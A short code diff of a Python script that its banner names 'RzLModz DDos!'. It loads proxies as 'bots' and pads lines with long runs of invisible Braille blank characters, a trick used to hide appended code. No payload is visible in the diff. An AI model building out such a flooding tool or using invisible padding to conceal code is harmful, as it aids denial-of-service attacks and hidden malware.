@@ -9,8 +9,7 @@ import sys
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
     
-proxys = open('proxies.txt').readlines()
-bots = len(proxys)⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+proxys = open('proxies.txt').readlines()⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
 def si():
     print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mRzL \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to RzLModz DDos! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
